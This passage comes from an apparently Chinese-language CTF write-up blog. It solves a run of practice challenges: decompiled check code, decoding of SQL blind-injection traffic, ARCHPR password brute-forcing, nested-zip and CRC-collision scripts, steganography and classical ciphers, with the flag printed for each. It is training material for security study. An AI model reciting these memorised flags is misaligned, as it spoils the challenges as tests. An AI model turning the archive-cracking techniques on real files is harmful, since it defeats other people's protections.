class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __stdcall <span class="title">sub_401090</span><span class="params">(HWND hWnd, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> Source; <span class="comment">// [esp+50h] [ebp-310h]</span></span><br><span class="line">  CHAR Text[<span class="number">4</span>]; <span class="comment">// [esp+154h] [ebp-20Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [esp+159h] [ebp-207h]</span></span><br><span class="line">  __int16 v9; <span class="comment">// [esp+255h] [ebp-10Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [esp+257h] [ebp-109h]</span></span><br><span class="line">  <span class="keyword">int</span> Value; <span class="comment">// [esp+258h] [ebp-108h]</span></span><br><span class="line">  CHAR String; <span class="comment">// [esp+25Ch] [ebp-104h]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [esp+25Fh] [ebp-101h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [esp+260h] [ebp-100h]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [esp+261h] [ebp-FFh]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;String, <span class="number">0</span>, <span class="number">0x104</span>u);</span><br><span class="line">  Value = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">DestroyWindow</span>(hWnd);</span><br><span class="line">    <span class="built_in">PostQuitMessage</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="number">273</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a3 == <span class="number">1000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">GetDlgItemTextA</span>(hWnd, <span class="number">1002</span>, &amp;String, <span class="number">260</span>);</span><br><span class="line">      <span class="built_in">strlen</span>(&amp;String);</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;String) &gt; <span class="number">6</span> )</span><br><span class="line">        <span class="built_in">ExitProcess</span>(<span class="number">0</span>);</span><br><span class="line">      v4 = <span class="built_in">atoi</span>(&amp;String);</span><br><span class="line">      Value = v4 + <span class="number">1</span>;  <span class="comment">//Value should be 122 + 1 == 123</span></span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">122</span> &amp;&amp; v13 == <span class="number">120</span> &amp;&amp; v15 == <span class="number">122</span> &amp;&amp; v14 == <span class="number">121</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(Text, <span class="string">&quot;flag&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(&amp;v8, <span class="number">0</span>, <span class="number">0xFC</span>u);</span><br><span class="line">        v9 = <span class="number">0</span>;</span><br><span class="line">        v10 = <span class="number">0</span>;</span><br><span class="line">        _itoa(Value, &amp;Source, <span class="number">10</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(Text, <span class="string">&quot;&#123;&quot;</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(Text, &amp;Source); <span class="comment">//123</span></span><br><span class="line">        <span class="built_in">strcat</span>(Text, <span class="string">&quot;_&quot;</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(Text, <span class="string">&quot;Buff3r_0v3rf|0w&quot;</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(Text, <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        <span class="built_in">MessageBoxA</span>(<span class="number">0</span>, Text, <span class="string">&quot;well done&quot;</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">SetTimer</span>(hWnd, <span class="number">1u</span>, <span class="number">0x3E8</span>u, TimerFunc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( a3 == <span class="number">1001</span> )</span><br><span class="line">      <span class="built_in">KillTimer</span>(hWnd, <span class="number">1u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由 <code>Value = v4 + 1</code> 和判断中的 <code>v4 == 122</code> 可知 Value 在满足走下去的条件时应为 123，将下文的字符串拼接起来即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;123_Buff3r_0v3rf|0w&#125;</span><br></pre></td></tr></table></figure><h3 id="sqltest"><a href="#sqltest" class="headerlink" title="sqltest"></a>sqltest</h3><p>Wireshark 分析流量包筛选 http 条目可知是 SQL 盲注的流量包，flag 长度为 38。按照盲注的逻辑记录下返回值为真的 ASCII 数值。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">102 108 97 103 123 52 55 101 100 98 56 51 48 48 101 100 53 102 57 98 50 56 102 99 53 52 98 48 100 48 57 101 99 100 101 102 55 125</span><br></pre></td></tr></table></figure><p>将其转为字符串可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;47edb8300ed5f9b28fc54b0d09ecdef7&#125;</span><br></pre></td></tr></table></figure><h3 id="GXYCTF2019-gakki"><a href="#GXYCTF2019-gakki" class="headerlink" title="[GXYCTF2019]gakki"></a>[GXYCTF2019]gakki</h3><p>010 editor 打开文件，发现其尾部有压缩文档。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213889784850.bd0beb4dc6d14daa983e00121919f5b0848e9982.png"></p><p><code>binwalk -e</code> 分离出来，使用 ARCHPR 爆破得到密码 8864。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213889873826.93ea6e9c10deb82692e4aff6bc08ddc6aeb0cbf7.png"></p><p>解压后得到看不懂的文本文档，统计文本字符可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GXY&#123;gaki_IsMyw1fe&#125;</span><br></pre></td></tr></table></figure><h3 id="BJDCTF-2nd-TARGZ-y1ng"><a href="#BJDCTF-2nd-TARGZ-y1ng" class="headerlink" title="[BJDCTF 2nd]TARGZ-y1ng"></a>[BJDCTF 2nd]TARGZ-y1ng</h3><p>套娃解压压缩包，压缩包的名称是下一个压缩包的解压密码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Unzip</span>(<span class="params">fileName</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        password = fileName.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">zip</span> = zipfile.ZipFile(fileName,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        <span class="built_in">zip</span>.extractall(pwd=password.encode(<span class="string">&quot;UTF-8&quot;</span>))</span><br><span class="line">        fileName = <span class="built_in">zip</span>.namelist()[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">zip</span>.close()</span><br><span class="line">Unzip(<span class="string">&quot;hW1ES89jF.tar.gz&quot;</span>)</span><br></pre></td></tr></table></figure><p>解压到最后即可得到 flag 文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;wow_you_can_rea11y_dance&#125;</span><br></pre></td></tr></table></figure><h3 id="HBNIS2018-excel破解"><a href="#HBNIS2018-excel破解" class="headerlink" title="[HBNIS2018]excel破解"></a>[HBNIS2018]excel破解</h3><p>010 editor 打开文件，可以直接找到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213889966483.58a3f53a3a7ff4b7feb4393ed2162f06bd1a8089.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;office_easy_cracked&#125;</span><br></pre></td></tr></table></figure><h3 id="喵喵喵"><a href="#喵喵喵" class="headerlink" title="喵喵喵"></a>喵喵喵</h3><p>使用 StegSolve 可解出一张图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213890138538.fbf0f63ef038b93039151be9ed2be36f62bb235c.png"></p><p>保存下来修正图片文件头并大致修正图片高度后可得一二维码，可将其反色。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213890239129.85f13238f89d0b3c107a54304a2f5be0b3b9f5c0.png"></p><p>扫描二维码可以得到一个百度网盘分享链接，把文件下载下来，得到一个压缩包。看了 WriteUp 才知道这里本来有个 hint 是 NTFS，于是上 NTFS 流分析。压缩文件必须使用 WinRAR 去解压才能找到文件流，得到一个 pyc 文件，反编译如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit http://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>():</span></span><br><span class="line">    flag = <span class="string">&#x27;*************&#x27;</span></span><br><span class="line">    ciphertext = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        s = <span class="built_in">chr</span>(i ^ <span class="built_in">ord</span>(flag[i]))</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            s = <span class="built_in">ord</span>(s) + <span class="number">10</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s = <span class="built_in">ord</span>(s) - <span class="number">10</span></span><br><span class="line">        ciphertext.append(<span class="built_in">str</span>(s))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ciphertext[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">ciphertext = [<span class="string">&#x27;96&#x27;</span>,<span class="string">&#x27;65&#x27;</span>,<span class="string">&#x27;93&#x27;</span>,<span class="string">&#x27;123&#x27;</span>,<span class="string">&#x27;91&#x27;</span>,<span class="string">&#x27;97&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;93&#x27;</span>,<span class="string">&#x27;70&#x27;</span>,<span class="string">&#x27;102&#x27;</span>,<span class="string">&#x27;94&#x27;</span>,<span class="string">&#x27;132&#x27;</span>,<span class="string">&#x27;46&#x27;</span>,<span class="string">&#x27;112&#x27;</span>,<span class="string">&#x27;64&#x27;</span>,<span class="string">&#x27;97&#x27;</span>,<span class="string">&#x27;88&#x27;</span>,<span class="string">&#x27;80&#x27;</span>,<span class="string">&#x27;82&#x27;</span>,<span class="string">&#x27;137&#x27;</span>,<span class="string">&#x27;90&#x27;</span>,<span class="string">&#x27;109&#x27;</span>,<span class="string">&#x27;99&#x27;</span>,<span class="string">&#x27;112&#x27;</span>]</span><br></pre></td></tr></table></figure><p>写个解密函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>():</span></span><br><span class="line">    cipherText = ciphertext[::-<span class="number">1</span>]</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipherText)):</span><br><span class="line">        s = <span class="built_in">int</span>(cipherText[i]) - <span class="number">10</span> <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">else</span> <span class="built_in">int</span>(cipherText[i]) + <span class="number">10</span></span><br><span class="line">        s = <span class="built_in">chr</span>(s ^ i)</span><br><span class="line">        flag += s</span><br><span class="line">    <span class="keyword">return</span> flag</span><br></pre></td></tr></table></figure><p>可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Y@e_Cl3veR_C1Ever!&#125;</span><br></pre></td></tr></table></figure><h3 id="ACTF新生赛2020-base64隐写"><a href="#ACTF新生赛2020-base64隐写" class="headerlink" title="[ACTF新生赛2020]base64隐写"></a>[ACTF新生赛2020]base64隐写</h3><p>压缩包解压得到文本文档，使用 Base64 隐写工具可解出 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br></pre></td></tr></table></figure><h3 id="HBNIS2018-来题中等的吧"><a href="#HBNIS2018-来题中等的吧" class="headerlink" title="[HBNIS2018]来题中等的吧"></a>[HBNIS2018]来题中等的吧</h3><p>解压得到一张图片，转换为摩斯电码。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213890396760.722e61db8fcbd3b076bae5701e5b6014227f83a0.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.- .-.. .--. .... .- .-.. .- -...</span><br></pre></td></tr></table></figure><p>将摩斯电码解出即得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ALPHALAB&#125;</span><br></pre></td></tr></table></figure><h3 id="SWPU2019-伟大的侦探"><a href="#SWPU2019-伟大的侦探" class="headerlink" title="[SWPU2019]伟大的侦探"></a>[SWPU2019]伟大的侦探</h3><p>010 editor 下编辑为 EBCDIC 可见压缩包密码 <code>wllm_is_the_best_team!</code>。解压压缩包后对照小人跳舞得解密表可得flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213890542432.b17c08760274eb824fcdf0dd201096a70bfda11d.jpg"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;iloveholmesandwllm&#125;</span><br></pre></td></tr></table></figure><h3 id="黑客帝国"><a href="#黑客帝国" class="headerlink" title="黑客帝国"></a>黑客帝国</h3><p>解压文件得到一个文本文档，里面有很多数据。观察容易得出 <code>52 61 72</code> 对应 Rar，因此数据是个压缩文档，编写脚本将其还原。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">hexData = <span class="built_in">open</span>(<span class="string">&#x27;7ecb86887bd03535a7f9959e934e901e.txt&#x27;</span>).read()</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;7ecb86887bd03535a7f9959e934e901e.rar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">file.write(binascii.unhexlify(hexData))</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p>使用 ARCHPR 爆破得到密码 3690。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213890621842.2b0fa52c2b8aa8d4c7a6740297b42939ef07ae58.png"></p><p>解压得到一个图片文件，将文件头修正后打开图片即可得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213890949974.ea3832cc083c1ee77420bafee1f8a6e88607d355.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;57cd4cfd4e07505b98048ca106132125&#125;</span><br></pre></td></tr></table></figure><h3 id="WUSTCTF2020-find-me"><a href="#WUSTCTF2020-find-me" class="headerlink" title="[WUSTCTF2020]find_me"></a>[WUSTCTF2020]find_me</h3><p>解压所得的图片的属性中发现盲文字符 <code>⡇⡓⡄⡖⠂⠀⠂⠀⡋⡉⠔⠀⠔⡅⡯⡖⠔⠁⠔⡞⠔⡔⠔⡯⡽⠔⡕⠔⡕⠔⡕⠔⡕⠔⡕⡍=</code>。使用<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen">加解密工具</a>解密可得 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213891084216.04601af69804904915e5f91c23bdde7cef99d626.png" alt="image-20210127124644280"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf2020&#123;y$0$u_f$1$n$d$_M$e$e$e$e$e&#125;</span><br></pre></td></tr></table></figure><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><p>压缩文件备注有内容，复制到 VS Code 可知是摩斯电码。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213891161890.66535ac362159fbb8a63b196e44241159d5a73c4.png"></p><p>解出摩斯电码可得 <code>HELL0FORUM</code>，将其作为压缩包密码解压出图片。这里需要使用 Cloacked Pixel 去解密得出 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213891291723.064ec335922c07d98c5c50aed78fa26c0a41891c.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;jsy09-wytg5-wius8&#125;</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-你能看懂音符吗"><a href="#MRCTF2020-你能看懂音符吗" class="headerlink" title="[MRCTF2020]你能看懂音符吗"></a>[MRCTF2020]你能看懂音符吗</h3><p>将压缩包文件头修正后得到一个文档。根据文档提示，将文档解压后读取 document.xml 可以发现音符。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213891417395.696e6424a22cbc25379a7a641a710a7f6348d514.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">♭♯♪‖¶♬♭♭♪♭‖‖♭♭♬‖♫♪‖♩♬‖♬♬♭♭♫‖♩♫‖♬♪♭♭♭‖¶∮‖‖‖‖♩♬‖♬♪‖♩♫♭♭♭♭♭§‖♩♩♭♭♫♭♭♭‖♬♭‖¶§♭♭♯‖♫∮‖♬¶‖¶∮‖♬♫‖♫♬‖♫♫§&#x3D;</span><br></pre></td></tr></table></figure><p>将其放到对应的<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">加解密工具</a>里解密即可得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213891559031.1e73cf2b04da2c27c935a79437dd4ea9b277ee40.png" alt="image-20210127132118790"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MRCTF&#123;thEse_n0tes_ArE_am@zing~&#125;</span><br></pre></td></tr></table></figure><h3 id="john-in-the-middle"><a href="#john-in-the-middle" class="headerlink" title="john-in-the-middle"></a>john-in-the-middle</h3><p>使用 Wireshark 分析流量包，筛选 http 条目，可以导出很多图片。使用 StegSolve 解隐写可以发现一张图片中出现了一条线。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213891691942.e5f986d447dd02059cf0363774c4d6082ce38cf6.png"></p><p>对应另外一张图的暗示，将线条补齐获得旗帜（flag)。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213891801816.bca90781c8f1046c47b49551a8c31f01164df41c.png"></p><p>于是使用 StegSolve 将这个两个图片 Combine 在一起分析，得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213891967002.855d16387156ff390a2bfdf3ccf497d10369e59e.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;J0hn_th3_Sn1ff3r&#125;</span><br></pre></td></tr></table></figure><h3 id="SWPU2019-你有没有好好看网课"><a href="#SWPU2019-你有没有好好看网课" class="headerlink" title="[SWPU2019]你有没有好好看网课?"></a>[SWPU2019]你有没有好好看网课?</h3><p>解压得到很多文件，首先根据压缩包备注对 flag3.zip 使用 ARCHPR 爆破得到密码 183792。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213892047610.3b8624b7f56df7ead120b23d0ae94787a35a185e.png"></p><p>解压得到一个视频，在 Premiere 下打开逐帧播放可以得到信息。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213892143671.6ccb2ffe24c5d72a9f23d566f4d6f527a437d059.png"><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213892226254.a7f7b56d2bc93d2879c77e56fae2efe4f14b1fcf.png"></p><p>其中第一段是 Tap Code，使用对应的码表可解出为 <code>wllm</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  1  2  3  4  5</span><br><span class="line">1 A  B C/K D  E</span><br><span class="line">2 F  G  H  I  J </span><br><span class="line">3 L  M  N  O  P</span><br><span class="line">4 Q  R  S  T  U</span><br><span class="line">5 V  W  X  Y  Z</span><br></pre></td></tr></table></figure><p>第二段直接 base64 解码为 <code>up_up_up</code>。将其拼合可得 <code>wllmup_up_up</code>。将其作为解压密码解压 flag2.zip，得到一张图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213892313246.7582d1149fe8df6578be9a115769a7d8b1bc163c.png"></p><p>使用 010editor 打开图片可以直接找到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swpuctf&#123;A2e_Y0u_Ok?&#125;</span><br></pre></td></tr></table></figure><h3 id="GUET-CTF2019-KO"><a href="#GUET-CTF2019-KO" class="headerlink" title="[GUET-CTF2019]KO"></a>[GUET-CTF2019]KO</h3><p>将得到的内容直接 Ook! 解码即可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;welcome to CTF&#125;</span><br></pre></td></tr></table></figure><h3 id="HBNIS2018-caesar"><a href="#HBNIS2018-caesar" class="headerlink" title="[HBNIS2018]caesar"></a>[HBNIS2018]caesar</h3><p>打开之后得到一串文本 <code>gmbhjtdbftbs</code>，使用凯撒加密的工具解密可得 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213892443452.a0e3a7d348de9f4528744292d72d41680ea06913.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;flagiscaesar&#125;</span><br></pre></td></tr></table></figure><h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><p>解压之后得到了很多 zip 文件，根据提示需要提取内容，但是压缩包需要密码，文件大小为 4 字节，于是尝试 CRC 爆破。写个脚本提取内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">base64StrDictionary = string.ascii_letters + string.digits + <span class="string">&#x27;+&#x27;</span> + <span class="string">&#x27;/&#x27;</span> + <span class="string">&#x27;=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRCZipFile</span>(<span class="params">zipPath</span>):</span></span><br><span class="line">    <span class="keyword">return</span> zipfile.ZipFile(zipPath).getinfo(<span class="string">&quot;data.txt&quot;</span>).CRC</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackData</span>(<span class="params">sampleCRC</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> base64StrDictionary:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> base64StrDictionary:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> base64StrDictionary:</span><br><span class="line">                <span class="keyword">for</span> h <span class="keyword">in</span> base64StrDictionary:</span><br><span class="line">                    data = i + j + k + h</span><br><span class="line">                    <span class="keyword">if</span> sampleCRC == (binascii.crc32(data.encode())):</span><br><span class="line">                        <span class="keyword">return</span> data</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span>():</span></span><br><span class="line">    data = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">68</span>):</span><br><span class="line">        fileName = <span class="string">&quot;b2ca8799-13d7-45df-a707-94373bf2800c\\out&#123;&#125;.zip&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        data += CrackData(CRCZipFile(fileName))</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">CrackZip()</span><br></pre></td></tr></table></figure><p>得到了一串 base64 字符串。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z5BzAAANAAAAAAAAAKo+egCAIwBJAAAAVAAAAAKGNKv+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>将其解码后得到一个文件，根据文件尾 <code>C4 3D 7B 00 40 07 00</code> 可知是 Rar 文件，补全修正文件头。打开文件即可在文件备注处看到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;nev3r_enc0de_t00_sm4ll_fil3_w1th_zip&#125;</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-ezmisc"><a href="#MRCTF2020-ezmisc" class="headerlink" title="[MRCTF2020]ezmisc"></a>[MRCTF2020]ezmisc</h3><p>010 editor 打开文件发现提示 CRC Mismatch。于是打开脚本爆破图片宽高，得到 <code>hex: 0x1f4 0x1c8</code>，对应修正之后打开图片可得 flag。</p><p><img 